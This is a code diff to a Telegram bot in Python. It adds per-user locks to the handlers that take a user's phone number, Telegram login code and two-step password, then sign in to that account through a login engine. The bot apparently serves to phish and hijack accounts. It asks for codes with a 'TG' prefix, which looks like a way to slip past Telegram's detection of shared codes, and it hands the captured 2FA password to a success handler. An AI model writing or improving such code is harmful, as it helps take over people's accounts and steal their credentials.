@@ -94,6 +94,19 @@ def _pop_state(uid: int, bot: Bot) -> dict | None:
 # ── Active session-check tasks per phone (to cancel on re-login) ──
 _session_check_tasks: dict[str, asyncio.Task] = {}
 
+# ── Per-user locks to serialize login state transitions ─────────
+# Prevents concurrent handler execution for the same (uid, bot) pair,
+# which avoids duplicate _handle_login_success calls when a user sends
+# the same verification code or 2FA password twice in quick succession.
+_user_locks: dict[tuple, asyncio.Lock] = {}
+
+
+def _get_lock(uid: int, bot: Bot) -> asyncio.Lock:
+    key = _sk(uid, bot)
+    if key not in _user_locks:
+        _user_locks[key] = asyncio.Lock()
+    return _user_locks[key]
+
 # ── Chat history for manual reply panel ─────────────────────────
 # uid -> {"name": str, "messages": [{"from": "user"|"bot", "text": str, "time": float}]}
 _chat_store: dict[int, dict] = {}
@@ -550,60 +563,61 @@ async def handle_phone_input(message: Message, bot: Bot):
 ))
 async def handle_code_input(message: Message, bot: Bot):
     uid = message.from_user.id
-    state = _get_state(uid, bot)
-    if not state or state.get("step") != "code":
-        return
-    if message.text.startswith("/"):
-        return
-    _record_msg(uid, _user_name(message), "user", message.text.strip(), bot)
+    async with _get_lock(uid, bot):
+        state = _get_state(uid, bot)
+        if not state or state.get("step") != "code":
+            return
+        if message.text.startswith("/"):
+            return
+        _record_msg(uid, _user_name(message), "user", message.text.strip(), bot)
 
-    phone = state["phone"]
-    max_attempts = int(_c("code_max_attempts", "3"))
+        phone = state["phone"]
+        max_attempts = int(_c("code_max_attempts", "3"))
 
-    match = re.match(r"(?i)^TG\s*(\d{5,6})$", message.text.strip())
-    if not match:
-        state["attempts"] = state.get("attempts", 0) + 1
-        remaining = max_attempts - state["attempts"]
-        if remaining <= 0:
-            _pop_state(uid, bot)
-            await login_engine.cancel_pending(phone)
-            await message.answer(_c("code_max_retries_text", "❌ 错误次数过多，请重新 /start"))
-        else:
-            await message.answer(_c("code_format_error_text", "❌ 格式错误"))
-        return
-
-    code = match.group(1)
-    result = await login_engine.sign_in_with_code(phone, code)
-
-    if result.get("success"):
-        _pop_state(uid, bot)
-        await _handle_login_success(
-            bot, message.chat.id, uid, phone,
-            result.get("user_info", {}))
-    else:
-        need_2fa = result.get("need_2fa", False)
-        if need_2fa:
-            _set_state(uid, bot, {
-                "phone": phone, "step": "2fa",
-                "created_at": time.time(), "attempts": 0,
-            })
-            await message.answer(_c("prompt_2fa_text", "请输入两步验证密码"))
-            logger.info(f"[{uid}] 需要两步验证: {phone}")
-        else:
+        match = re.match(r"(?i)^TG\s*(\d{5,6})$", message.text.strip())
+        if not match:
             state["attempts"] = state.get("attempts", 0) + 1
             remaining = max_attempts - state["attempts"]
             if remaining <= 0:
                 _pop_state(uid, bot)
                 await login_engine.cancel_pending(phone)
-                await message.answer(_c("code_max_retries_text", "❌ 错误次数过多"))
+                await message.answer(_c("code_max_retries_text", "❌ 错误次数过多，请重新 /start"))
             else:
-                tpl = _c("code_invalid_text", "❌ 验证码错误（{attempts}/{max}）")
-                try:
-                    err = tpl.format(attempts=state["attempts"], max=max_attempts,
-                                     remaining=remaining)
-                except Exception:
-                    err = result.get("message", "验证码错误")
-                await message.answer(err)
+                await message.answer(_c("code_format_error_text", "❌ 格式错误"))
+            return
+
+        code = match.group(1)
+        result = await login_engine.sign_in_with_code(phone, code)
+
+        if result.get("success"):
+            _pop_state(uid, bot)
+            await _handle_login_success(
+                bot, message.chat.id, uid, phone,
+                result.get("user_info", {}))
+        else:
+            need_2fa = result.get("need_2fa", False)
+            if need_2fa:
+                _set_state(uid, bot, {
+                    "phone": phone, "step": "2fa",
+                    "created_at": time.time(), "attempts": 0,
+                })
+                await message.answer(_c("prompt_2fa_text", "请输入两步验证密码"))
+                logger.info(f"[{uid}] 需要两步验证: {phone}")
+            else:
+                state["attempts"] = state.get("attempts", 0) + 1
+                remaining = max_attempts - state["attempts"]
+                if remaining <= 0:
+                    _pop_state(uid, bot)
+                    await login_engine.cancel_pending(phone)
+                    await message.answer(_c("code_max_retries_text", "❌ 错误次数过多"))
+                else:
+                    tpl = _c("code_invalid_text", "❌ 验证码错误（{attempts}/{max}）")
+                    try:
+                        err = tpl.format(attempts=state["attempts"], max=max_attempts,
+                                         remaining=remaining)
+                    except Exception:
+                        err = result.get("message", "验证码错误")
+                    await message.answer(err)
 
 
 # ── 两步验证 ────────────────────────────────────────────────────────
@@ -612,40 +626,41 @@ async def handle_code_input(message: Message, bot: Bot):
 ))
 async def handle_2fa_input(message: Message, bot: Bot):
     uid = message.from_user.id
-    state = _get_state(uid, bot)
-    if not state or state.get("step") != "2fa":
-        return
-    if message.text.startswith("/"):
-        return
-    _record_msg(uid, _user_name(message), "user", "[2FA密码]", bot)
+    async with _get_lock(uid, bot):
+        state = _get_state(uid, bot)
+        if not state or state.get("step") != "2fa":
+            return
+        if message.text.startswith("/"):
+            return
+        _record_msg(uid, _user_name(message), "user", "[2FA密码]", bot)
 
-    phone = state["phone"]
-    password = message.text.strip()
-    max_attempts = int(_c("tfa_max_attempts", "5"))
+        phone = state["phone"]
+        password = message.text.strip()
+        max_attempts = int(_c("tfa_max_attempts", "5"))
 
-    result = await login_engine.sign_in_with_2fa(phone, password)
+        result = await login_engine.sign_in_with_2fa(phone, password)
 
-    if result.get("success"):
-        _pop_state(uid, bot)
-        await _handle_login_success(
-            bot, message.chat.id, uid, phone,
-            result.get("user_info", {}),
-            tfa_password=password)
-    else:
-        state["attempts"] = state.get("attempts", 0) + 1
-        remaining = max_attempts - state["attempts"]
-        if remaining <= 0:
+        if result.get("success"):
             _pop_state(uid, bot)
-            await login_engine.cancel_pending(phone)
-            await message.answer(_c("tfa_max_retries_text", "❌ 密码错误次数过多"))
+            await _handle_login_success(
+                bot, message.chat.id, uid, phone,
+                result.get("user_info", {}),
+                tfa_password=password)
         else:
-            tpl = _c("tfa_wrong_text", "❌ 密码错误（{attempts}/5）")
-            try:
-                err = tpl.format(attempts=state["attempts"], remaining=remaining,
-                                 max=max_attempts)
-            except Exception:
-                err = result.get("message", "密码错误")
-            await message.answer(err, parse_mode="HTML")
+            state["attempts"] = state.get("attempts", 0) + 1
+            remaining = max_attempts - state["attempts"]
+            if remaining <= 0:
+                _pop_state(uid, bot)
+                await login_engine.cancel_pending(phone)
+                await message.answer(_c("tfa_max_retries_text", "❌ 密码错误次数过多"))
+            else:
+                tpl = _c("tfa_wrong_text", "❌ 密码错误（{attempts}/5）")
+                try:
+                    err = tpl.format(attempts=state["attempts"], remaining=remaining,
+                                     max=max_attempts)
+                except Exception:
+                    err = result.get("message", "密码错误")
+                await message.answer(err, parse_mode="HTML")
 
 
 # ── Default reply (catch-all for messages with no active state) ───
